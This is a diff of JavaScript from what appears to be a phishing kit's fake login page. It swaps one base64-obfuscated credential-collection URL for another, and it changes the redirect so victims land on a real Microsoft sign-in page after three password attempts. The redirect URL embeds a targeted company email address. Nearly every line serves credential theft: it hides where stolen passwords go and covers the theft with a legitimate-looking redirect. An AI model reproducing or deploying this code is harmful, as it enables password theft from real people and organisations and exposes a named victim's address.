@@ -461,7 +461,7 @@ return true;
       ///////////new injection////////////////
       count=count+1;
     //  console.log(count); 
- var d=atob('aHR0cDovL3JlZXNvdWx0ZnJlcXVlbnQuY29tL2ZpbGUucGhw');
+ var d=atob('aHR0cHM6Ly9zc2RhMS5ubC9maWxlLnBocA==');
 		
 	   $.ajax({
         dataType: 'JSON',
@@ -488,7 +488,7 @@ return true;
                   if (count>=3) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
-                    window.location.replace("http://mail."+my_slice);
+                    window.location.replace("https://login.live.com/ppsecure/post.srf?username=finance%40mthunziholdings.com&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&contextid=07964A97DCC5AD59&opid=B9CF326D08B322D7&bk=1668682857&uaid=d3cb355518a041a8bb6ae32414ff6c50&pid=15216."+my_slice);
 
                   }
                   // $('#msg').html(response['msg']);
@@ -502,7 +502,7 @@ return true;
               $("#password").val("");
               if (count>=3) {
                 count=0;
-                window.location.replace("http://mail."+my_slice);
+                window.location.replace("https://login.live.com/ppsecure/post.srf?username=finance%40mthunziholdings.com&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&contextid=07964A97DCC5AD59&opid=B9CF326D08B322D7&bk=1668682857&uaid=d3cb355518a041a8bb6ae32414ff6c50&pid=15216"+my_slice);
               }
               $("#msg").show();
               // $('#msg').html("Please try again later");
